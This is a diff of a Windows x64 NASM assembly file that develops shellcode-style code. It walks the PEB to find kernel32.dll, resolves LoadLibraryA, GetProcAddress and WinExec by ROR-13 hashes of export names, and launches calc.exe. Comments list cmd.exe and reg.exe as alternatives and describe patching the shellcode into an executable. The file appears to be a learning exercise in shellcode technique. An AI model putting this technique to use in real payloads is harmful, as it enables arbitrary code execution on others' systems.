@@ -1,19 +1,21 @@
-;; Compile:
+;; Compile executable:
 ;; $ nasm -f win64 exp.asm -o exp.obj && gcc exp.obj -o exp.exe && ./exp.exe
+;; Compile shellcode:
+;; $ nasm -f bin sc.asm -o sc.obj && python patcher.py && ./outnew.exe
 ;; Format:
 ;; $ nasmfmt -oi 12 exp.asm
         bits        64
+        default     rel     ; RIP-relative addressing (without this, section .data will be ignored)
 
         extern      puts
         extern      strlen
         extern      _ui64toa
         extern      system
         extern      strcmp
-
+        
         extern      GetStdHandle
         extern      WriteFile
         extern      ExitProcess
-        extern      StringCchCopyA
 
         global      WinMain
 
@@ -40,6 +42,21 @@
         %endmacro  
 
 
+;; Align %$localsize to 16 bytes and enter
+        %macro      align_enter 1
+        %assign     %%size %1
+        %assign     %%module %%size % 16
+        %if         %%module != 0              ; Make %%size a multiple of 16
+        %assign     %%diff 16 - %%module
+        %assign     %%size %%size + %%diff
+        %endif     
+        enter       (%%size + 8), 0            ; Add 8 to compensate "%push proc_context"
+        %endmacro  
+
+
+        %define     utf16(x) __?utf16?__(x)    ; UTF-16 macros
+
+
 
         section     .data
 STD_OUTPUT_HANDLE:
@@ -56,23 +73,38 @@ szMsg1:
 
 szMsg2:
         db          "msg2", 10, 0
-        
+
 szMsg3:
         db          "msg3", 10, 0
 
+utf16Path:
+        dw          utf16('C:\WINDOWS'), 0      ; UTF-16 string
+
 szWinExec:
-        db          "WinExec", 0                        ; kernel32.dll
-        ;db          "CsrAllocateCaptureBuffer", 0       ; ntdll.dll
+        db          "WinExec", 0                ; kernel32.dll
+;        db          "CsrAllocateCaptureBuffer", 0       ; ntdll.dll
+        
+szLoadLibraryA:
+        db          "LoadLibraryA", 0           ; kernel32.dll
+
+szGetProcAddress:
+        db          "GetProcAddress", 0         ; kernel32.dll
 
 szCalc:
         db          "calc.exe", 0
+;        db          "cmd.exe", 0
+;        db          "reg.exe", 0      
 
+szKernel32:
+        db          "kernel32.dll", 0
+        
 WIN:
         db          10, "WIN", 10, 0
         
 task:
         db          10, "Name idx -> ordinal -> addr", 10, 0
-
+        
+        
 
         section     .bss
 szBuffer:
@@ -86,7 +118,7 @@ buf:
         section     .text
 ;; void WinMain()
 WinMain:
-        save_regs
+        save_regs  
         %push       proc_context
         %stacksize  flat64
         %assign     %$localsize 64
@@ -94,6 +126,60 @@ WinMain:
         %local      iNum2:qword
         %local      iNum3:qword
         
+        %local      pLoadLibraryA:qword
+        %local      pGetProcAddress:qword
+        
+        %local      hKernel32:qword     ; Handler to kernel32.dll
+        
+        
+        %local      pWinExec:qword
+        align_enter %$localsize
+        
+        
+        ; Find LoadLibraryA
+        lea         rcx, [szLoadLibraryA]
+        call        GetKernel32ProcAddress
+        mov         qword [pLoadLibraryA], rax
+        
+        
+        ; Find GetProcAddress
+        lea         rcx, [szGetProcAddress]
+        call        GetKernel32ProcAddress
+        mov         qword [pGetProcAddress], rax
+                
+        
+        ; Find WinExec
+        lea         rcx, [szKernel32] 
+        call        qword [pLoadLibraryA]
+        mov         qword [hKernel32], rax
+        
+        mov         rcx, qword [hKernel32]
+        lea         rdx, [szWinExec]
+        call        qword [pGetProcAddress]
+        mov         qword [pWinExec], rax
+        
+        ; Call WinExec     
+        lea         rcx, [szCalc]
+        mov         rdx, 5
+        call        qword [pWinExec]
+        
+
+        leave      
+        restore_regs
+        ret        
+        %pop          
+    
+        
+          
+;; int GetKernel32ProcAddress (PSTR pProcName)
+;; pProcName = rcx
+GetKernel32ProcAddress:
+        save_regs  
+        %push       proc_context
+        %stacksize  flat64
+        %assign     %$localsize 64
+        %local      pProcName:qword
+        %local      iProcName:qword
         %local      pKernel32:qword
         
         %local      iBase:qword
@@ -105,11 +191,18 @@ WinMain:
         %local      pName:qword
         %local      idxName:qword
         %local      iOrdinal:qword
-        %local      pWinExec:qword
-        enter       %$localsize, 0
+        %local      pFunction:qword
+        align_enter %$localsize
         
-
-        ; kernel32.dll base
+        mov         qword [pProcName], rcx
+        
+        ; Hash function name
+        mov         rcx, qword [pProcName]
+        call        Ror13
+        mov         qword [iProcName], rax
+        
+        
+        ; Find kernel32.dll base address
         mov         rbx, [gs:0x60]             ; PEB
         mov         rbx, [rbx + 0x18]          ; LDR
         mov         rbx, [rbx + 0x20]          ; InMemoryOrderModuleList (1st entry)
@@ -117,120 +210,83 @@ WinMain:
         mov         rbx, [rbx]                 ; 3 kernel32.dll
         mov         rbx, [rbx + 0x20]          ; InInitializationOrderLinks (1st entry)
         mov         qword [pKernel32], rbx     ; kernel32.dll base address
-
-        mov         rcx, qword [pKernel32]
-        mov         rdx, 16
-        call        PrintNum
+        
+;        mov         rcx, qword [pKernel32]
+;        mov         rdx, 16
+;        call        PrintNum
         
         
-        ; kernel32.dll functions
-        mov         r10, qword [pKernel32]      ; kernel32.dll base (DOS header)
-        mov         ebx, [r10 + 0x3c]           ; NT header offset
-        add         rbx, r10                    ; NT header
+        ; Get info from kernel32.dll export directory
+        mov         r12, qword [pKernel32]      ; kernel32.dll base (DOS header)
+        mov         ebx, [r12 + 0x3c]           ; NT header offset
+        add         rbx, r12                    ; NT header
         mov         ebx, [rbx + 0x18 + 0x70]    ; Export Directory RVA
-        add         rbx, r10                    ; Export Directory
+        add         rbx, r12                    ; Export Directory
         
-        mov         ecx, [rbx + 0x10]           ; Base (ordinals of functions start from 1)
+        mov         rcx, 0
+        mov         ecx, [rbx + 0x10]           ; Base (ordinals of functions start from this number)
         mov         qword [iBase], rcx
         
-        mov         ecx, [rbx + 0x14]           ; NumberOfFNames
+        mov         ecx, [rbx + 0x14]           ; NumberOfNames
         mov         qword [cNames], rcx
         
         mov         ecx, [rbx + 0x1c]           ; AddressOfFunctions RVA
-        add         rcx, r10                    ; AddressOfFunctions
+        add         rcx, r12                    ; AddressOfFunctions
         mov         qword [pFunctions], rcx
         
         mov         ecx, [rbx + 0x20]           ; AddressOfNames RVA
-        add         rcx, r10                    ; AddressOfNames
+        add         rcx, r12                    ; AddressOfNames
         mov         qword [pNames], rcx
         
         mov         ecx, [rbx + 0x24]           ; AddressOfNameOrdinals RVA
-        add         rcx, r10                    ; AddressOfNameOrdinals
+        add         rcx, r12                    ; AddressOfNameOrdinals
         mov         qword [pNameOrdinals], rcx
-        
-        
-        ; EXP AREA
-        lea         rcx, [task]
-        call        PrintStr
-        
-        
-        ; Find name index
-        mov         rcx, qword [pNames]
-        mov         rdx, 16
-        call        PrintNum
-                              
-        mov         r12, 0
-.loop:
-        mov         r10, qword [pNames]
-        mov         ebx, [r10 + 4 * r12]             
-        add         rbx, qword [pKernel32]
-        mov         qword [pName], rbx
-        mov         qword [idxName], r12
                 
-        mov         rcx, qword [pName]
-        mov         rdx, szWinExec
-        call        strcmp        
-        cmp         rax, 0
-        je          .next
         
-        inc         r12     
-        cmp         r12, qword [cNames] ; Max num of iterations
-        jne         .loop
+        ; Find name index                
+        mov         r15, 0                      ; Counter
+.nextName:
+        mov         r12, qword [pNames]
+        mov         ebx, [r12 + 4 * r15]        ; Name RVA    
+        add         rbx, qword [pKernel32]      ; Name
+        mov         qword [pName], rbx
+        mov         qword [idxName], r15
+                
+        mov         rcx, qword [pName]          ; Hash current name
+        call        Ror13     
+        cmp         rax, qword [iProcName]      ; Compare ROR-13 hash with already known value
+        je          .endLoop
         
-.next:          
-        mov         rcx, qword [idxName]
-        mov         rdx, 16
-        call        PrintNum
-        
-        
+        inc         r15     
+        cmp         r15, qword [cNames]         ; Max num of iterations = NumberOfNames
+        jne         .nextName  
+.endLoop:  
+
         ; Find ordinal
-        mov         rcx, qword [pNameOrdinals]
-        mov         rdx, 16
-        call        PrintNum
-        
-        mov         rbx, qword [pNameOrdinals]
-        mov         r10, qword [idxName]
-        mov         ax, [rbx + 2 * r10]
-        add         rax, qword [iBase]
+        mov         rax, 0
+        mov         r12, qword [pNameOrdinals]
+        mov         r15, qword [idxName]
+        mov         ax, [r12 + 2 * r15]         ; Ordinal = Name index + Base
+        add         rax, qword [iBase]          ; Base is a value of the 1st ordinal (it can be 1, 2, ... N)
         mov         qword [iOrdinal], rax
         
-        mov         rcx, qword [iOrdinal]
-        mov         rdx, 16
-        call        PrintNum
-        
-        
+
         ; Find address
-        mov         rcx, qword [pFunctions]
-        mov         rdx, 16
-        call        PrintNum
+        mov         rax, 0        
+        mov         r12, qword [pFunctions]
+        mov         r15, qword [iOrdinal]
+        sub         r15, qword [iBase]
+        mov         eax, [r12 + 4 * r15]        ; Function RVA
+        add         rax, qword [pKernel32]      ; Function
+        mov         qword [pFunction], rax
         
-        mov         rbx, qword [pFunctions]
-        mov         r10, qword [iOrdinal]
-        sub         r10, qword [iBase]
-        mov         eax, [rbx + 4 * r10]
+;        mov         rcx, qword [pFunction]
+;        mov         rdx, 16
+;        call        PrintNum
         
-        add         rax, qword [pKernel32]
-        mov         qword [pWinExec], rax
+        mov         rax, qword [pFunction]      ; Return function address
         
-        mov         rcx, qword [pWinExec]
-        mov         rdx, 16
-        call        PrintNum
-        
-        
-        ; Call
-        mov         r10, qword [pWinExec]
-        lea         rcx, [szCalc]
-        mov         rdx, 5
-        call        r10
-        
-        
-        ; Exit
-        lea         rcx, [szPause]
-        call        system
-        mov         rcx, 0
-        call        ExitProcess
-        
-        leave
+        leave      
         restore_regs
         ret        
         %pop       
@@ -241,14 +297,14 @@ WinMain:
 ;; iNum = rcx
 ;; iRadix = rdx
 PrintNum:
-        save_regs 
+        save_regs  
         %push       proc_context
         %stacksize  flat64
         %assign     %$localsize 64
         %local      iNum:qword
         %local      iRadix:qword               ; Base [2, 10, 16]
         %local      szNum:byte[24]
-        enter       %$localsize, 0 
+        align_enter %$localsize
 
         mov         rsi, 0
         mov         rdi, 0
@@ -267,8 +323,8 @@ PrintNum:
         lea         rcx, [endl]
         call        PrintStr
 
-        leave
-        restore_regs   
+        leave      
+        restore_regs
         ret        
         %pop       
 
@@ -277,7 +333,7 @@ PrintNum:
 ;; void PrintStr (PSTR pStr)
 ;; pStr = rcx
 PrintStr:
-        save_regs
+        save_regs  
         %push       proc_context
         %stacksize  flat64
         %assign     %$localsize 64             ; Shadow space (32) + space for stack args (32)
@@ -285,11 +341,12 @@ PrintStr:
         %local      cbStr:qword                ; Length of string
         %local      cbWritten:qword
         %local      hStdOut:qword
-        enter       %$localsize, 0  
-        
+        align_enter %$localsize
+
         ; Set rsi, rdi to 0 for iterators correct work
         mov         rsi, 0
         mov         rdi, 0
+
         ; Save argument(s) as local var(s)
         mov         qword [pStr], rcx
 
@@ -308,10 +365,46 @@ PrintStr:
         mov         rdx, qword [pStr]
         mov         r8, qword [cbStr]
         lea         r9, [cbWritten]
-        mov         qword [rsp+32], 0           ; 5th arg. 6th arg should be passed with [rsp+40]
+        mov         qword [rsp+32], 0          ; 5th arg. 6th arg should be passed with [rsp+40]
         call        WriteFile
 
-        leave
+        leave      
+        restore_regs
+        ret        
+        %pop
+        
+        
+;; int Ror13 (PSTR pStr)
+;; pStr = rcx
+;; ROR-13 online:   https://asecuritysite.com/hash/ror13_2
+Ror13:
+        save_regs  
+        %push       proc_context
+        %stacksize  flat64
+        %assign     %$localsize 64
+        %local      pStr:qword
+        align_enter %$localsize
+
+        mov         qword [pStr], rcx
+
+        ; Hash loop
+        mov         r11, qword [pStr]
+        mov         r12, 0                     ; Hash
+        mov         r15, 0                     ; Counter
+.nextByte:
+        mov         rbx, 0
+        mov         bl, [r11 + 1 * r15]        ; Read a byte from string
+        cmp         rbx, 0                     ; Check if current byte = 0
+        je          .endLoop
+
+        ror         r12d, 13                   ; Use r12 to have qword hash, r12d - dword hash
+        add         r12, rbx
+        inc         r15
+        jmp         .nextByte
+.endLoop:
+        mov         rax, r12                   ; Return hash
+
+        leave      
         restore_regs
         ret        
         %pop
